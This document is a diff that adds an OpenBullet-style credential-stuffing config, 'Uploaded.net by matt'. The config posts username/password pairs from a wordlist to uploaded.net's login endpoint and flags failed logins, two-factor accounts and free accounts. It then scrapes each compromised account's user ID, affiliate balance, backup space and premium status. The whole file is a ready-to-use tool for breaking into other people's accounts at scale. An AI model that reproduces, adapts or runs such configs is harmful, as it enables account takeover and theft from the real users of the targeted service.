@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "Uploaded.net by matt",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-01T01:26:37.0961719+02:00",
+  "AdditionalInfo": "",
+  "Author": "matt",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://uploaded.net/io/login" 
+  CONTENT "id=<USER>&pw=<PASS>&_=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "User and password do not match!" 
+    KEY "{\"err\":\"User and password do not match!\"}" 
+    KEY "{\"err\":\"" 
+
+#Capture REQUEST GET "http://uploaded.net/me" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "<th>Yes</th>" 
+
+#ID PARSE "<SOURCE>" LR "<input type=\"hidden\" id=\"user_id\" value=\"" "\" />" -> CAP "ID" 
+
+#Balance PARSE "<SOURCE>" LR "location.href='/affiliate'\">" ";</em></th>" -> CAP "Balance" 
+
+#BalanceFix FUNCTION Translate 
+  KEY "&" VALUE "" 
+  "<Balance>" -> CAP "Balance" 
+
+#Backup-Space PARSE "<SOURCE>" LR "<li style=\"margin-right:20px\"><h2>Backup-space: " "</h2></" -> CAP "Backup-Space" 
+
+#Status PARSE "<SOURCE>" LR "<a href=\"register\"><em>" "</em></" -> CAP "Status" "" " | made by matt" 
+
+#Check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "upgrade to Premium now!" 
+
